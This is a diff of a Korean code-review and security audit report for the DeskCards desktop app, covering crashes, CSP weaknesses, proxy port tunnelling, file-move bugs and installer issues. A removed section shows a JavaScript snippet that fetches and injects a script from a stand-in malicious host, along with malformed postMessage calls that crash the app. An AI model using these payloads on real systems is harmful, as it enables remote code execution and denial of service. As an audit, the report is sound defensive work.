@@ -1,292 +1,185 @@
-# DeskCards 코드 리뷰 및 정밀 결함 분석 보고서
+# DeskCards 코드 품질 및 아키텍처 개선 분석 보고서
 
-본 문서는 DeskCards 코드베이스(`v:\desktop\deskfolders`)를 대상으로 정적 소스 분석, 타입 시스템 검증, 런타임 논리 흐름 추적을 거쳐 작성된 결함 분석 보고서입니다.  
-모든 결함에 대해 **실제 발생 시나리오(Trigger Scenario)**와 **코드 수준의 오류 발생 메커니즘(Mechanism)**, 그리고 **실제 영향 및 권장 조치 방안**을 상세히 기재하였습니다.
-
----
-
-## 1. 결함 요약 (Summary Matrix)
-
-| 구분 | 심각도 | 항목 | 영향 및 위험도 | 파일 위치 |
-|:---:|:---:|---|---|---|
-| **01** | **High** | `DardView.OnMessage` 타입 캐스팅 미처리로 인한 프로세스 크래시 | 악의적 웹 메시지 한 줄로 앱 전체 강제 종료 (DoS) | `src/DeskCards/DardView.cs:324, 331` |
-| **02** | **High** | CSP `'unsafe-inline'` 허용으로 인한 원격 임의 코드 실행 | 승인되지 않은 외부 JS 동적 주입 및 실행 (보안 검증 무력화) | `src/DeskCards/DardView.cs:185` |
-| **03** | **High** | `DardProxy` 임의 포트 허용 및 유휴 연결 무한 누수 | SSH/SMTP 등 일반 TCP 터널 악용, 소켓 및 Task 영구 누수 | `src/DeskCards/DardProxy.cs:55-81, 116` |
-| **04** | **Medium** | `GroupManager.DeleteGroup` 부분 이동 후 중단 결함 | 이동 실패 시 롤백 없이 파일 파편화 및 상태 불일치 | `src/DeskCards/GroupManager.cs:662` |
-| **05** | **Medium** | `FileOps.Unique`의 점(dot) 파일 선두 공백 생성 버그 | `.gitignore` 등 중복 시 ` (2).gitignore` 공백 파일 생성 | `src/DeskCards/FileOps.cs:183-186` |
-| **06** | **Medium** | 업데이트 시 `version.txt` 및 보조 파일 미동기화 | 앱 업데이트 후에도 설치 디렉터리에 과거 버전 정보 영구 잔존 | `installer/.../SetupEngine.cs:60`<br>`src/DeskCards/Updater.cs:118` |
-| **07** | **Medium** | 앱 제거(Uninstall) 시 `version.txt` 미삭제로 설치 폴더 잔존 | 정상 제거 후에도 빈 설치 폴더와 잔여 파일 영구 방치 | `installer/.../SetupEngine.cs:135-140` |
-| **08** | **Medium** | `App.WaitForUpdatedFrom` PID 재활용 시 15초 기동 지연 | 구버전 PID가 다른 프로세스에 할당될 경우 15초 UI 블로킹 | `src/DeskCards/App.xaml.cs:123` |
-| **09** | **Low** | `GroupModel.Reload` 시 UI 스레드 동기 Shell I/O 프리징 | 오프라인 네트워크 드라이브 바로가기 존재 시 UI 먹통 | `src/DeskCards/ShellIcons.cs:55` |
-| **10** | **Low** | `EdgeBar` 40ms 무한 폴링으로 인한 CPU 유휴 상태 방해 | 상시 초당 25회 디스패처 기상, 노트북 배터리 절전 방해 | `src/DeskCards/EdgeBar.cs:42` |
-| **11** | **Low** | 주요 비동기 진입점들의 `async void` 사용 | 예외 발생 시 비정상 종료 직행 위험 | `src/DeskCards/GroupManager.Dards.cs:230` 등 |
-| **12** | **Low** | 탐색기 재시작 시 N개 카드의 중복 `Reconcile` 호출 | Progman 복구 시 불필요한 연속 디렉터리 스캔 | `src/DeskCards/GroupManager.cs:541` |
+본 문서는 결함 수정 및 회귀 테스트 보강 커밋(`073b271`) 이후의 전체 코드베이스를 대상으로, **런타임 안정성, 성능 병목, 경계 조건 예외 처리, 코드 정리(Cleanup) 및 기술 부채**를 엄격하게 전수 점검하여 작성된 2차 심층 리뷰 보고서입니다.  
+이미 해결된 과거 결함은 모두 제외하고, **현재 시점에서 개선이 필요한 실질적인 과제들만을 선별**하여 기술하였습니다.
 
 ---
 
-## 2. [High] 보안 및 안정성 치명 결함
+## 1. 개선 과제 요약 (Review Matrix)
 
-### 01. `DardView.OnMessage` 타입 캐스팅 미처리로 인한 프로세스 크래시 (DoS)
-- **코드 위치**: `src/DeskCards/DardView.cs:324, 331`
-- **유효성 판정**: **100% 확실 (Valid & Reproducible)**
-- **발생 상황 (Trigger Scenario)**:
-  - 사용자가 설치한 `.dard` 카드의 내부 스크립트(또는 카드가 임포트한 서드파티 라이브러리나 악성 스크립트)가 규격과 다른 형태의 인자를 담은 WebMessage를 전송할 때 발생합니다.
-  - 예시 1: `cards.post` 호출 시 객체 대신 숫자나 문자열을 전달:
-    ```javascript
-    window.chrome.webview.postMessage({ t: "call", id: 1, fn: "cards.post", args: 12345 });
-    ```
-  - 예시 2: `openUrl` 호출 시 문자열 대신 객체를 전달:
-    ```javascript
-    window.chrome.webview.postMessage({ t: "call", id: 2, fn: "openUrl", args: { target: "https://example.com" } });
-    ```
-- **내부 발생 메커니즘 (Mechanism)**:
-  1. `DardView.OnMessage`는 수신된 JSON 문자열을 `JsonNode.Parse`하여 `Handle(fn, args)`로 넘깁니다.
-  2. `case "cards.post":`에서 `args?["to"]`를 호출합니다. .NET의 `System.Text.Json.Nodes.JsonNode` 구현상, 해당 노드가 `JsonObject`가 아닌 `JsonValue`(숫자, 문자열 등)일 경우 인덱서 호출 시 **`System.InvalidOperationException: The node must be of type 'JsonObject'`**가 발생합니다.
-  3. `case "openUrl":`에서 `args?.GetValue<string>()`를 호출합니다. 해당 노드가 `JsonValue`가 아닌 `JsonObject`일 경우 **`System.InvalidOperationException: The node must be of type 'JsonValue'`**가 발생합니다.
-  4. `DardView.OnMessage`의 예외 포획 구문은 다음과 같이 `DardCallException`만을 잡도록 한정되어 있습니다:
+| 번호 | 영역 | 항목 | 심각도 | 파일 위치 | 영향 요약 |
+|:---:|:---:|---|:---:|---|---|
+| **01** | **성능/안정성** | `GroupModel.Reload`의 UI 스레드 동기 파일 열거 및 중복 `Directory.Exists` | Medium | `src/DeskCards/GroupModel.cs:19, 109` | 파일 수 증가 및 네트워크/동기화 폴더 시 UI 프레임 드롭 |
+| **02** | **아키텍처** | `ShellIcons.Async` 단일 STA 스레드로 인한 전역 헤드오브라인(HoL) 블로킹 | Medium | `src/DeskCards/ShellIcons.Async.cs:14, 32` | 단일 느린 I/O가 다른 모든 그룹의 정상 아이콘 로딩까지 지연 |
+| **03** | **자원 관리** | 카드 바 비활성화(`BarEnabled == false`) 시에도 40ms 무한 타이머 동작 | Low | `src/DeskCards/EdgeBar.cs:42, 194` | 기능 OFF 상태에서도 상시 초당 25회 디스패처 기상 및 자원 낭비 |
+| **04** | **데이터 무결성** | `FileOps.MoveContentsAndDelete` 드라이브 간 이동(Cross-volume) 시 폴더 이동 실패 | Medium | `src/DeskCards/FileOps.cs:150-160` | 바탕화면이 다른 드라이브/OneDrive일 때 서브폴더가 있으면 그룹 삭제 실패 |
+| **05** | **안정성** | `Config.Save` 실패 시 오류 묵살 및 `.bak` 파일 락 충돌 시 무음 실패 | Low | `src/DeskCards/Config.cs:187-194` | 외부 동기화/백업 락 발생 시 설정 저장이 실패해도 사용자 인지 불가 |
+| **06** | **보안/네트워크** | `DardProxy`의 비웹 포트(DB/RDP/캐시 등) CONNECT 터널링 허용 구조 | Medium | `src/DeskCards/DardProxy.cs:116` | Chromium 차단 외 비표준 포트(6379, 3389 등)로의 TCP 터널링 가능 |
+| **07** | **웹 런타임** | `DardScriptPolicy` 인코딩 가정 및 `<template>` 태그 내 스크립트 해시 누락 | Low | `src/DeskCards/DardScriptPolicy.cs:19-21` | 웹 컴포넌트 템플릿 내 스크립트 작성 시 런타임 CSP 차단 발생 |
+| **08** | **코드 정리** | 리팩토링 잔여 고아 요약 주석(Orphan Docstrings) 방치 | Trivial | `src/DeskCards/Config.cs:202`<br>`src/DeskCards/GroupManager.cs:33, 91` | 삭제·이동된 메서드의 주석이 엉뚱한 멤버에 붙어 IDE 툴팁 왜곡 |
+| **09** | **UI 동시성** | `ExpandedWindow` 설정 버튼 연속 클릭 시 중복 창 생성 위험 | Low | `src/DeskCards/ExpandedWindow.xaml.cs:64` | 창 닫힘 애니메이션 중 빠른 더블클릭 시 다중 이벤트 핸들러 등록 |
+| **10** | **예외 처리** | `DardPackage.Unzip`에서 `InvalidDataException` 외 스트림 예외 누락 | Low | `src/DeskCards/DardPackage.cs:243` | 비표준 압축 시 `NotSupportedException` 등이 원시 예외로 탈출 |
+
+---
+
+## 2. 세부 분석 및 개선 방안
+
+### 01. [성능/안정성] `GroupModel.Reload`의 UI 스레드 동기 파일 열거 및 중복 I/O
+- **코드 위치**: `src/DeskCards/GroupModel.cs:19-22, 109-114`
+- **문제점 분석**:
+  1. 아이콘 추출은 `ShellIcons.Async.cs`의 백그라운드 워커로 성공적으로 분리되었으나, **디렉터리 파일 열거 자체(`Directory.EnumerateFileSystemEntries`)는 여전히 UI 메인 스레드에서 동기적으로 실행**됩니다.
+  2. 또한 `ShellEntry` 생성자 내부에서 파일명/확장자 분리를 위해 다음 코드를 매 항목마다 호출합니다:
      ```csharp
-     try { Reply(id, Handle(fn, args)); }
-     catch (DardCallException ex) { ... }
+     Name = Directory.Exists(path) || ext.Length == 0
+         ? System.IO.Path.GetFileName(path)
+         : System.IO.Path.GetFileNameWithoutExtension(path);
      ```
-  5. 따라서 `InvalidOperationException`은 전혀 잡히지 않고 WebView2의 이벤트 디스패처로 탈출하며, DeskCards에는 전역 `DispatcherUnhandledException` 핸들러가 없으므로 **바탕화면의 DeskCards 앱 프로세스 전체가 즉시 강제 종료(Crash)**됩니다.
+     `GroupModel.cs:113`에서 이미 `var attr = File.GetAttributes(p)`를 조회했음에도 불구하고, 비트 연산(`(attr & FileAttributes.Directory) != 0`)을 사용하지 않고 **디스크 시스템 콜인 `Directory.Exists(path)`를 항목마다 중복해서 동기 호출**하고 있습니다.
 - **실제 영향**:
-  - 카드 내 자바스크립트의 사소한 파라미터 버그나 악의적인 호출 한 줄로 사용자의 바탕화면 카드 전체가 순식간에 꺼지는 서비스 거부(DoS) 취약점입니다.
-- **권장 수정 방안**:
-  - `Handle` 내에서 인자 타입을 사전에 안전하게 검증(`args is JsonObject obj`, `args is JsonValue val`)하거나, `OnMessage`의 `catch` 블록에서 `Exception` 전반(최소한 `InvalidOperationException`)을 잡아 클라이언트에 오류 응답(`ok: false, name: "TypeError"`)을 반환하도록 개선해야 합니다.
+  - 그룹 폴더 안에 수백 개의 파일이 있거나, 해당 폴더가 네트워크 드라이브(UNC), 클라우드 동기화(OneDrive, DropBox) 경로일 경우 `Reload()`가 트리거될 때마다 UI 스레드가 수십~수백 밀리초간 정지하여 버벅임(Micro-stutter)이 발생합니다.
+- **개선 방안**:
+  - `ShellEntry` 생성 시 이미 확인한 `attr` 또는 `isDir` 불리언 값을 인자로 넘겨 `Directory.Exists` 시스템 콜을 제거하고, 파일 수가 많은 폴더의 열거 작업도 백그라운드 태스크로 넘긴 뒤 UI 컬렉션을 교체하도록 개선합니다.
 
 ---
 
-### 02. CSP `'unsafe-inline'` 허용으로 인한 원격 임의 스크립트 실행
-- **코드 위치**: `src/DeskCards/DardView.cs:185-190`
-- **유효성 판정**: **100% 확실 (Valid & Reproducible)**
-- **발생 상황 (Trigger Scenario)**:
-  - `internet` 권한을 가진 `.dard` 카드를 사용자가 처음에 SHA-256 해시를 검토하고 승인(Allow)하여 실행 중인 상황입니다.
-  - 카드 제작자 또는 해킹된 배포 서버가 승인 검토를 통과한 패키지 내부에 악성 코드를 직접 넣지 않고, 런타임에 외부 서버에서 동적으로 스크립트를 내려받아 실행하려 할 때 발생합니다.
-- **내부 발생 메커니즘 (Mechanism)**:
-  1. `DardView`는 카드 HTML 로드 시 다음과 같은 CSP 응답 헤더를 설정합니다:
+### 02. [아키텍처/병목] `ShellIcons.Async` 단일 STA 스레드로 인한 전역 헤드오브라인(HoL) 블로킹
+- **코드 위치**: `src/DeskCards/ShellIcons.Async.cs:13-21, 32-42`
+- **문제점 분석**:
+  1. `ShellIcons`는 셸 확장의 동시성 문제를 방지하기 위해 단 하나의 백그라운드 STA 스레드(`Worker`)와 단일 큐(`BlockingCollection<Action>`)를 사용합니다.
+  2. 모든 바탕화면 카드와 그룹 폴더가 이 단일 워커 스레드를 공유합니다.
+  3. 만약 어떤 사용자가 A 그룹 폴더에 오프라인 상태인 네트워크 드라이브(NAS) 바로가기나 반응이 극히 느린 외장 디스크의 파일을 넣어둔 경우, 단일 STA 스레드가 해당 파일 아이콘을 추출하느라 Windows Shell API 타임아웃(최대 10~30초) 동안 블로킹됩니다.
+- **실제 영향**:
+  - UI 스레드는 멈추지 않지만, **B 그룹, C 그룹 등 로컬 초고속 SSD에 있는 다른 정상적인 폴더들의 아이콘 로딩까지 모조리 대기열 뒤에 갇혀(Head-of-Line Blocking)**, 30초 동안 모든 카드가 기본 플레이스홀더 아이콘으로 멈춰 있게 됩니다.
+- **개선 방안**:
+  - 네트워크/원격 경로(UNC, `\\`로 시작하거나 네트워크 드라이브 문자)는 로컬 파일 큐와 분리된 전용 저순위 워커에서 처리하거나, 개별 셸 호출에 짧은 타임아웃을 강제하여 로컬 큐가 막히지 않도록 채널을 격리해야 합니다.
+
+---
+
+### 03. [자원 관리] 카드 바 비활성화(`BarEnabled == false`) 시에도 40ms 무한 타이머 동작
+- **코드 위치**: `src/DeskCards/EdgeBar.cs:42-44, 144-158, 194`
+- **문제점 분석**:
+  1. `EdgeBar`의 모니터링 타이머는 40ms 간격으로 상시 회전합니다:
      ```csharp
-     string csp = "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'" + net + "; ...";
+     // EdgeBar.cs:194
+     if (!mgr.BarEnabled || _suspended || mgr.Editing || !KeyCombo.IsDown(mgr.BarKeys)) return false;
      ```
-  2. 설계 문서(`project.md`, `docs/dard-design.html`)에는 *"스크립트는 언제나 페이지 안에 있는 것만(승인한 뒤에 코드가 바뀌지 않게)"*이라고 명시되어 있습니다.
-  3. 그러나 W3C CSP 표준에서 `script-src 'unsafe-inline'`은 정적 인라인 태그뿐만 아니라 **DOM API를 통해 동적으로 생성·주입되는 `<script>` 요소의 실행도 전부 허용**합니다:
-     ```javascript
-     const s = document.createElement('script');
-     s.textContent = await (await fetch('https://malicious.org/payload.js')).text();
-     document.head.appendChild(s); // 'unsafe-inline'에 의해 차단 없이 즉시 실행됨!
-     ```
-  4. 오직 strict CSP(예: 스크립트 블록의 SHA-256 해시 목록 또는 논스(nonce)를 지정하고 `'unsafe-inline'`을 제외한 정책)에서만 동적 스크립트 주입이 원천 차단됩니다.
+  2. 사용자가 카드 설정에서 "카드 바 사용"을 껐더라도(`mgr.BarEnabled == false`), 타이머는 멈추지 않고 1초에 25번씩 지속적으로 `Tick()`을 호출하여 `Native.GetCursorPos()`와 `AtEdge()`를 연산합니다.
 - **실제 영향**:
-  - **"사용자가 처음에 승인한 패키지 내의 코드만 실행된다"는 DARD 플랫폼의 핵심 보안 모델이 완전히 우회**됩니다. 인터넷 권한이 승인된 카드는 사용자의 감시 없이 언제든지 외부에서 임의의 최신 악성 코드를 수신하여 실행할 수 있습니다.
-- **권장 수정 방안**:
-  - `card.html` 및 `settings.html`에 포함된 인라인 스크립트의 SHA-256 해시를 로드 시 계산하여 `script-src 'sha256-...'` 형태로 지정하고 `'unsafe-inline'`을 제거하거나, 랜덤 논스(nonce)를 주입하는 엄격한 CSP 정책을 적용해야 합니다.
+  - 사용하지도 않는 기능 때문에 불필요한 디스패처 메시지가 지속 발생하고, 모바일 노트북 환경에서 미세한 CPU C-state 방해 요인이 됩니다.
+- **개선 방안**:
+  - `mgr.Changed` 이벤트에서 `mgr.BarEnabled`를 확인하여 `false`일 때는 `_timer.Stop()`, 다시 켜졌을 때만 `_timer.Start()`하도록 라이프사이클을 연동해야 합니다.
 
 ---
 
-### 03. `DardProxy` 임의 포트 허용 및 유휴 연결 무한 누수
-- **코드 위치**: `src/DeskCards/DardProxy.cs:55-81, 116`
-- **유효성 판정**: **100% 확실 (Valid & Reproducible)**
-- **발생 상황 (Trigger Scenario)**:
-  - **시나리오 A (임의 포트 악용)**: `internet` 권한 카드가 공인망에 위치한 25(SMTP), 22(SSH), 445(SMB), 6379(Redis) 등의 비웹 포트로 TCP 연결을 요청할 때.
-  - **시나리오 B (소켓 누수)**: 카드가 외부 서버로 CONNECT 터널을 개설한 후, 양쪽 종단(클라이언트와 원격 서버)이 데이터를 교환하지 않고 유휴(Idle) 상태로 방치하거나 네트워크 불안정으로 연결이 끊어지지 않은 채 멈춰 있을 때.
-- **내부 발생 메커니즘 (Mechanism)**:
-  1. `DardProxy.TrySplit`의 포트 검사는 `port is < 1 or > 65535`만 거르므로, 공인 IP이기만 하면 25(스팸 메일 릴레이), 22(SSH 무차별 대입 터널) 등 어떤 포트로의 CONNECT 터널도 그대로 허용됩니다.
-  2. 스트림 릴레이 단계(`RelayAsync`)에서 다음과 같이 양방향 복사를 수행합니다:
+### 04. [데이터 무결성] `FileOps.MoveContentsAndDelete` 드라이브 간 이동(Cross-volume) 시 폴더 이동 실패
+- **코드 위치**: `src/DeskCards/FileOps.cs:150-160`, `src/DeskCards/GroupManager.cs:670`
+- **문제점 분석**:
+  1. 그룹 삭제 시 내부 항목을 바탕화면(`FileOps.UserDesktop`)으로 이동하는 `MoveContentsAndDelete` 내부 로직:
      ```csharp
-     var a = clientStream.CopyToAsync(upstreamStream);
-     var b = upstreamStream.CopyToAsync(clientStream);
-     await Task.WhenAny(a, b);
+     static void Move(string from, string to)
+     {
+         if (Directory.Exists(from)) Directory.Move(from, to);
+         else File.Move(from, to);
+     }
      ```
-  3. `CopyToAsync`에 초기 연결에 사용했던 타임아웃 토큰(`timeout.Token`)이나 유휴 CancellationToken이 일절 전달되지 않습니다.
-  4. 따라서 양쪽 종단 중 어느 한쪽도 FIN 패킷을 보내 연결을 닫지 않으면, 두 개의 `CopyToAsync` Task와 열린 소켓 핸들이 **앱이 종료될 때까지 영구히 메모리에 남아 누수**됩니다.
-  5. 추가로 `Task.WhenAny` 완료 후 스트림을 닫을 때 반대편 스트림 복사에서 발생하는 `ObjectDisposedException`이 비동기 환경에서 Unobserved Exception으로 방치될 수 있습니다.
+  2. Windows 환경에서 사용자 바탕화면이 D 드라이브에 있거나, OneDrive 폴더 리디렉션(`C:\Users\...\OneDrive\Desktop`)을 사용하고 있을 때, 그룹 폴더(`%USERPROFILE%\DeskCards\그룹`) 내에 서브폴더가 들어있는 경우:
+  3. `File.Move`는 드라이브 간 복사-삭제가 자동 지원되지만, **.NET의 `Directory.Move`는 드라이브 간(Cross-volume) 이동 시 `IOException: Source and destination path must have identical roots` 예외를 던지며 실패**합니다.
 - **실제 영향**:
-  - DeskCards 프로세스가 외부 임의 포트 공격의 경유지(프록시 봇)로 악용될 수 있으며, 장시간 실행 시 네트워크 유휴 소켓과 스레드 풀 자원이 고갈되어 메모리 누수가 발생합니다.
-- **권장 수정 방안**:
-  - 프록시 허용 포트를 일반적인 웹 포트(80, 443 등)로 화이트리스트 제한하고, 양방향 릴레이에 유휴 타임아웃(Idle Timeout)을 적용하여 일정 시간 통신이 없으면 소켓을 능동적으로 정리해야 합니다.
+  - 그룹 안에 일반 파일만 있으면 정상 이동되지만, 서브폴더가 단 하나라도 들어 있으면 그룹 삭제가 실패하고 롤백이 발생하여 그룹을 삭제할 수 없게 됩니다.
+- **개선 방안**:
+  - `Path.GetPathRoot(from)`과 `Path.GetPathRoot(to)`가 다를 경우, 재귀 디렉터리 복사 후 원본 삭제를 수행하는 안전 폴백(Cross-volume directory move fallback)을 적용해야 합니다.
 
 ---
 
-## 3. [Medium] 데이터 무결성, 설정 및 갱신 결함
-
-### 04. `GroupManager.DeleteGroup` 부분 이동 후 중단 결함
-- **코드 위치**: `src/DeskCards/GroupManager.cs:662-674`
-- **유효성 판정**: **100% 확실 (Valid & Reproducible)**
-- **발생 상황 (Trigger Scenario)**:
-  - 사용자가 카드 폴더를 삭제하려 할 때, 그룹 폴더 안에 여러 파일(예: 5개)이 들어 있고 그중 특정 파일(예: 3번째 파일 `work.docx`)을 사용자가 워드나 다른 프로그램에서 열어 두어 파일 시스템 독점 락(Exclusive Lock)이 걸려 있는 상황.
-- **내부 발생 메커니즘 (Mechanism)**:
-  1. `DeleteGroup`은 삭제 전 내부 파일들을 사용자의 바탕화면(`FileOps.UserDesktop`)으로 먼저 이동시킵니다:
-     ```csharp
-     foreach (var path in entries)
-         if (!FileOps.MoveTo(path, FileOps.UserDesktop)) return false;
-     Directory.Delete(g.Folder, recursive: false);
-     ```
-  2. 1번째, 2번째 파일은 성공적으로 바탕화면으로 이동됩니다.
-  3. 3번째 잠긴 파일에서 `File.Move`가 `IOException`을 던지고, `FileOps.MoveTo`는 이를 잡아 대화 상자를 띄운 뒤 `false`를 반환합니다.
-  4. `DeleteGroup`은 즉시 `return false`로 실행을 중단합니다.
-  5. **이미 이동된 1, 2번째 파일에 대한 롤백(되돌리기) 로직이 전혀 없습니다.**
-  6. 결과적으로 `Directory.Delete`는 호출되지 않아 그룹 폴더는 여전히 남아 있고, 1·2번 파일은 바탕화면으로 나가 버렸으며, 3·4·5번 파일은 그룹 폴더에 갇히게 됩니다.
+### 05. [안정성] `Config.Save` 실패 시 오류 묵살 및 `.bak` 파일 락 충돌 시 무음 실패
+- **코드 위치**: `src/DeskCards/Config.cs:187-194`
+- **문제점 분석**:
+  1. `Config.Save()`는 원자적 대체를 위해 `File.Replace(temporary, _filePath, _filePath + ".bak")`를 사용합니다.
+  2. 백신 실시간 감시, 클라우드 동기화(OneDrive), 인덱싱 서비스가 순간적으로 `config.json.bak`를 읽기 전용으로 열고 있으면 `File.Replace`는 `IOException`을 던집니다.
+  3. `Config.Save()`는 모든 예외를 잡아서 단순히 `return false;`만 반환하고 임시 파일을 지웁니다.
+  4. 더 심각한 점은, `GroupManager.cs`, `DeskCard.cs` 등 **앱 전체에서 `_cfg.Save()`를 호출하는 거의 모든 곳에서 반환값 `bool`을 전혀 검사하지 않고 버린다**는 것입니다(`_cfg.Save();`).
 - **실제 영향**:
-  - 그룹을 삭제하려다 실패했을 뿐인데, 그룹에 있던 파일들의 절반은 바탕화면으로 흩어지고 절반은 폴더에 남아 파일 체계가 두 동강으로 파편화되는 데이터 일관성 훼손이 발생합니다.
-- **권장 수정 방안**:
-  - 이동 시작 전 모든 파일에 대해 잠금 및 쓰기 권한을 사전 검사(Dry-run)하거나, 도중 실패 시 이미 이동한 파일들을 원래 폴더로 복구하는 보상 트랜잭션(Rollback) 로직을 도입해야 합니다.
+  - 사용자가 카드 위치를 옮기거나 크기를 조정했는데 외부 프로그램에 의해 저장이 실패해도 사용자나 관리자에게 아무런 피드백이 없어, 다음 실행 때 위치가 이전 상태로 되돌아가는 현상이 발생합니다.
+- **개선 방안**:
+  - `File.Replace` 실패 시 재시도 로직을 도입하거나 백업 파일 락 우회 전략을 마련하고, 저장 실패 시 최소한 로그 또는 UI 알림을 남기도록 보완해야 합니다.
 
 ---
 
-### 05. `FileOps.Unique`의 점(dot) 파일 선두 공백 생성 버그
-- **코드 위치**: `src/DeskCards/FileOps.cs:183-186`
-- **유효성 판정**: **100% 확실 (Valid & Reproducible)**
-- **발생 상황 (Trigger Scenario)**:
-  - 그룹 폴더 안에 이미 `.gitignore` 또는 `.env` 파일이 존재하는 상태에서, 외부에서 동일한 이름의 `.gitignore` 파일을 드래그 앤 드롭하거나 붙여넣어 이름 충돌이 발생할 때.
-- **내부 발생 메커니즘 (Mechanism)**:
-  1. `FileOps.Unique`는 파일명 충돌 시 확장자를 분리하여 `(2)` 접미사를 붙입니다:
-     ```csharp
-     string stem = Path.GetFileNameWithoutExtension(name), ext = Path.GetExtension(name);
-     for (int i = 2; ; i++) {
-         dest = Path.Combine(folder, $"{stem} ({i}){ext}");
-     ```
-  2. .NET의 `Path.GetFileNameWithoutExtension(".gitignore")`는 **빈 문자열(`""`)**을 반환합니다. (확장자가 없는 게 아니라 파일명 전체가 확장자로 취급됨: `ext = ".gitignore"`).
-  3. 따라서 포맷 스트링 `${stem} ({i}){ext}`는 `"" + " (2)" + ".gitignore"`가 되어 **`" (2).gitignore"`(선두에 공백 1칸이 포함된 파일명)**을 생성합니다.
+### 06. [보안/네트워크] `DardProxy`의 비웹 포트(DB/RDP/캐시 등) CONNECT 터널링 허용 구조
+- **코드 위치**: `src/DeskCards/DardProxy.cs:116-119`
+- **문제점 분석**:
+  1. 유휴 릴레이 누수가 수정되었고 SSH(22)·SMTP(25)는 Chromium 자체에서 차단되지만, Chromium의 차단 포트 목록에 없는 일반 서비스 포트들이 여전히 다수 존재합니다:
+     - Redis: `6379`, MongoDB: `27017`, MySQL: `3306`, PostgreSQL: `5432`, RDP: `3389` 등
+  2. `DardProxy.TrySplit`은 여전히 `1 <= port <= 65535`만 검사하므로, 공인 IP 상의 데이터베이스나 원격 제어 포트에 대한 CONNECT 요청을 그대로 중계합니다.
 - **실제 영향**:
-  - 윈도우 파일 시스템에서 파일명 맨 앞에 공백이 들어가면 탐색기에서 파일명이 비정상 표시되거나, 명령줄(PowerShell, CMD, Git)에서 공백 이스케이프 누락으로 경로 인식 오류를 초래합니다.
-- **권장 수정 방안**:
-  - `string.IsNullOrEmpty(stem)`인 경우 파일명 전체 뒤에 접미사를 붙이도록 분기 처리해야 합니다 (예: `.gitignore (2)`).
+  - 카드가 웹 통신(HTTP/HTTPS)을 넘어 외부 데이터베이스나 인프라 관리 포트에 무차별 대입(Brute-force) 공격이나 비인가 프로토콜 패킷을 전송하는 프록시 터널로 악용될 여지가 남아 있습니다.
+- **개선 방안**:
+  - 웹 카드 플랫폼이라는 목적에 맞추어 `port is 80 or 443 or 8080 or 8443` 또는 허용 포트 화이트리스트 정책을 명시적으로 적용하는 심층 방어(Defense in Depth)가 바람직합니다.
 
 ---
 
-### 06. 업데이트 시 `version.txt` 및 보조 파일 미동기화
-- **코드 위치**: `installer/DeskCards.Setup/SetupEngine.cs:60`, `src/DeskCards/Updater.cs:118`
-- **유효성 판정**: **100% 확실 (Valid & Reproducible)**
-- **발생 상황 (Trigger Scenario)**:
-  - 앱 버전 `0.2.1`이 설치되어 있는 PC에서 인앱 자동 업데이트(또는 설치기 재실행)를 통해 최신 버전 `0.2.10`으로 업데이트를 완료했을 때.
-- **내부 발생 메커니즘 (Mechanism)**:
-  1. 최초 설치 시에는 `CopyDirectory(stage, _env.InstallDir)`를 통해 릴리스 아카이브 내의 `DeskCards.exe`와 `version.txt`가 모두 설치 디렉터리에 복사됩니다.
-  2. 그러나 이후 업데이트 단계(`UpdatePackage.Apply` 및 `SetupEngine.cs:60`)에서는 **오직 `DeskCards.exe` 단 1개 파일만 덮어쓰기 복사**합니다.
-  3. `UpdatePackage.Cleanup`은 업데이트가 끝나면 임시 스테이징 폴더(`update\0.2.10\`)를 통째로 삭제하므로, 새로 다운로드했던 `version.txt`는 버려집니다.
-  4. 그 결과 설치 디렉터리의 실행 파일은 0.2.10이지만, 바로 옆의 `version.txt`는 여전히 `0.2.1`로 방치됩니다.
+### 07. [웹 런타임] `DardScriptPolicy` 인코딩 가정 및 `<template>` 태그 내 스크립트 해시 누락
+- **코드 위치**: `src/DeskCards/DardScriptPolicy.cs:19-22`
+- **문제점 분석**:
+  1. `Encoding.UTF8.GetString(bytes)`로 디코딩을 고정하고 있으나, 카드가 UTF-16이나 BOM이 포함된 인코딩일 경우 해시 불일치가 발생할 수 있습니다.
+  2. `doc.QuerySelectorAll("script")`는 W3C DOM 표준상 `<template>` 태그 내부의 DocumentFragment 안쪽에 정의된 `<script>` 요소를 탐색하지 않습니다.
 - **실제 영향**:
-  - 설치 디렉터리의 버전 정보 불일치로 인해, 외부 스크립트, 관리 도구, 패키지 매니저(Scoop 등)가 설치 폴더의 `version.txt`를 읽을 경우 구버전이 설치되어 있다고 오판하게 됩니다. 추후 배포 패키지에 보조 DLL이나 리소스가 추가될 경우에도 업데이트에서 누락되는 구조적 결함입니다.
-- **권장 수정 방안**:
-  - 업데이트 적용 시 `DeskCards.exe`뿐만 아니라 스테이징 폴더의 `version.txt` 및 배포 아티팩트를 설치 디렉터리로 함께 동기화해야 합니다.
+  - 현대 웹 컴포넌트(Web Components)나 템플릿 기법을 사용하여 `<template><script>...</script></template>`를 작성하고 나중에 DOM에 붙이는 카드가 있다면, 해당 스크립트의 해시가 CSP 헤더에서 누락되어 런타임에 실행이 차단됩니다.
+- **개선 방안**:
+  - `template` 태그의 `content` 내부까지 재귀적으로 스크립트 태그를 수집하도록 보완합니다.
 
 ---
 
-### 07. 앱 제거(Uninstall) 시 `version.txt` 미삭제로 설치 폴더 잔존 *(신규)*
-- **코드 위치**: `installer/DeskCards.Setup/SetupEngine.cs:135-140`
-- **유효성 판정**: **100% 확실 (Valid & Reproducible)**
-- **발생 상황 (Trigger Scenario)**:
-  - 사용자가 Windows 제어판 또는 설정의 '설치된 앱'에서 DeskCards를 정상적으로 제거(Uninstall)할 때.
-- **내부 발생 메커니즘 (Mechanism)**:
-  1. `SetupEngine.Uninstall`은 설치 폴더 내의 실행 파일들을 삭제합니다:
-     ```csharp
-     foreach (string name in new[] { "DeskCards.exe", "DeskCards.exe.old", "DeskFolders.exe", "uninstall.exe" })
-         DeleteFile(Path.Combine(_env.InstallDir, name));
-     ```
-  2. 삭제 대상 목록에 `version.txt`가 빠져 있습니다.
-  3. 이어서 설치 디렉터리가 비어 있는지 검사하여 삭제를 시도합니다:
-     ```csharp
-     if (Directory.Exists(_env.InstallDir) && Directory.GetFileSystemEntries(_env.InstallDir).Length == 0)
-         Directory.Delete(_env.InstallDir);
-     ```
-  4. 그러나 `version.txt`가 여전히 남아 있으므로 `Directory.GetFileSystemEntries`의 길이는 1이 되어 폴더 삭제 조건이 무시됩니다.
-- **실제 영향**:
-  - 사용자가 앱을 완전히 삭제했음에도 불구하고, `%LOCALAPPDATA%\Programs\DeskCards` 폴더와 그 안의 `version.txt`가 지워지지 않고 사용자 PC에 영구히 찌꺼기 파일로 남게 됩니다.
